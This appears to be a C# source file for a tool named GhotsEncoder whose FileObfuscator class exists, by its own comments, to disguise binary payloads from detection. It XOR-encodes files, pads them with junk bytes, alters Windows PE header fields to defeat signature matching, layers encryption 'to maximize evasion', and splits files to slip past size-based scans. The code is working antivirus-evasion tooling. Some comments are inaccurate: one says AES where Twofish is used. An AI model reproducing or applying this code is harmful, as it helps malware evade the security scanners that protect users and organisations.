using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Security.Cryptography;

namespace GhotsEncoder 
{
    /// <summary>
    /// Provides methods for binary payload obfuscation to evade detection
    /// </summary>
    public static class FileObfuscator
    {
        private static readonly Random _random = new Random();

        /// <summary>
        /// Applies XOR encoding with a randomly generated key to obfuscate a file
        /// </summary>
        public static void XorObfuscate(string inputFile, string outputFile, byte[]? key)
        {
            // Generate random key if not provided
            if (key == null || key.Length == 0)
            {
                key = new byte[32]; // 256-bit key
                using (var rng = RandomNumberGenerator.Create())
                {
                    rng.GetBytes(key);
                }
            }

            byte[] fileBytes = File.ReadAllBytes(inputFile);
            byte[] obfuscated = new byte[fileBytes.Length + key.Length + 1];
            
            // Store key length and key at the beginning
            obfuscated[0] = (byte)key.Length;
            Buffer.BlockCopy(key, 0, obfuscated, 1, key.Length);
            
            // XOR the file content with the key (cycling through key bytes)
            for (int i = 0; i < fileBytes.Length; i++)
            {
                obfuscated[i + key.Length + 1] = (byte)(fileBytes[i] ^ key[i % key.Length]);
            }
            
            File.WriteAllBytes(outputFile, obfuscated);
        }

        /// <summary>
        /// Adds junk data to a file to change its signature
        /// </summary>
        public static void AddJunkData(string inputFile, string outputFile, int junkSize = 1024)
        {
            using (var input = File.OpenRead(inputFile))
            using (var output = File.Create(outputFile))
            {
                // Generate random junk data
                byte[] junk = new byte[junkSize];
                _random.NextBytes(junk);
                
                // Write junk marker and junk size
                output.WriteByte(0xEF); // Junk marker
                output.WriteByte((byte)(junkSize & 0xFF));
                output.WriteByte((byte)((junkSize >> 8) & 0xFF));
                
                // Write junk data
                output.Write(junk, 0, junk.Length);
                
                // Write actual file content
                input.CopyTo(output);
            }
        }

        /// <summary>
        /// Changes the PE header of a Windows executable to bypass signature detection
        /// This is a basic implementation and only modifies non-critical header values
        /// </summary>
        public static void ModifyPEHeader(string inputFile, string outputFile)
        {
            byte[] fileBytes = File.ReadAllBytes(inputFile);
            
            // Check if this is a PE file (starts with MZ header)
            if (fileBytes.Length > 64 && fileBytes[0] == 0x4D && fileBytes[1] == 0x5A)
            {
                // Find PE header offset (located at offset 0x3C)
                int peOffset = BitConverter.ToInt32(fileBytes, 0x3C);
                
                // Check if the PE header is valid
                if (peOffset < fileBytes.Length - 4 && 
                    fileBytes[peOffset] == 0x50 && fileBytes[peOffset + 1] == 0x45)
                {
                    // Modify timestamp (offset peOffset + 8, 4 bytes)
                    // This doesn't affect functionality but changes the file signature
                    byte[] timestamp = BitConverter.GetBytes((int)DateTime.Now.Ticks);
                    Buffer.BlockCopy(timestamp, 0, fileBytes, peOffset + 8, 4);
                    
                    // Optionally, modify other non-critical fields
                    // For example, change some flags in the Characteristics field (offset peOffset + 22)
                    // Be careful not to change critical flags that would make the executable unloadable
                    // Just flip a single bit in a safe location
                    fileBytes[peOffset + 22] ^= 0x01;
                    
                    File.WriteAllBytes(outputFile, fileBytes);
                    return;
                }
            }
            
            // If not a PE file or invalid PE header, just copy the file
            File.Copy(inputFile, outputFile, true);
        }

        /// <summary>
        /// Compresses and encrypts a file using a combination of methods to maximize evasion
        /// </summary>
        public static void FullObfuscation(string inputFile, string outputFile, string password)
        {
            // Create temporary files
            string tempFile1 = Path.GetTempFileName();
            string tempFile2 = Path.GetTempFileName();
            
            try
            {
                // Step 1: Add junk data
                AddJunkData(inputFile, tempFile1);
                
                // Step 2: XOR obfuscate 
                byte[] key = Encoding.UTF8.GetBytes(password);
                XorObfuscate(tempFile1, tempFile2, key);
                
                // Step 3: Encrypt with AES
                AdvancedEncryption.EncryptFileWithTwofish(password, tempFile2, outputFile, progress => { });
                
                Console.WriteLine("Full obfuscation complete:");
                Console.WriteLine("- Added junk data to change file signature");
                Console.WriteLine("- Applied XOR obfuscation");
                Console.WriteLine("- Encrypted using Twofish algorithm");
            }
            finally
            {
                // Clean up temporary files
                if (File.Exists(tempFile1)) File.Delete(tempFile1);
                if (File.Exists(tempFile2)) File.Delete(tempFile2);
            }
        }

        /// <summary>
        /// Splits a file into multiple smaller files and applies obfuscation to each part
        /// Useful for bypassing size-based scans
        /// </summary>
        public static void SplitAndObfuscate(string inputFile, string outputDirectory, int parts, string password)
        {
            if (!Directory.Exists(outputDirectory))
            {
                Directory.CreateDirectory(outputDirectory);
            }
            
            byte[] fileBytes = File.ReadAllBytes(inputFile);
            int partSize = (int)Math.Ceiling((double)fileBytes.Length / parts);
            
            for (int i = 0; i < parts; i++)
            {
                // Calculate actual bytes for this part
                int start = i * partSize;
                int length = Math.Min(partSize, fileBytes.Length - start);
                
                // Create part file
                string partFile = Path.Combine(outputDirectory, $"part_{i + 1}.bin");
                string encryptedPartFile = Path.Combine(outputDirectory, $"part_{i + 1}.enc");
                
                // Write part data
                using (var fs = File.Create(partFile))
                {
                    // Write part header with index and total parts
                    fs.WriteByte((byte)(i + 1));  // Part index (1-based)
                    fs.WriteByte((byte)parts);    // Total parts
                    
                    // Write part data
                    fs.Write(fileBytes, start, length);
                }
                
                // Now obfuscate and encrypt the part
                XorObfuscate(partFile, encryptedPartFile, Encoding.UTF8.GetBytes(password + i.ToString()));
                
                // Delete the unencrypted part
                File.Delete(partFile);
            }
            
            // Write a simple instruction file for reassembly
            string instructionFile = Path.Combine(outputDirectory, "readme.txt");
            File.WriteAllText(instructionFile, 
                $"This file was split into {parts} encrypted parts.\n" +
                "To reassemble, decrypt all parts with the same password and combine them in order.\n" +
                "For ethical use only.");
        }
    }
} 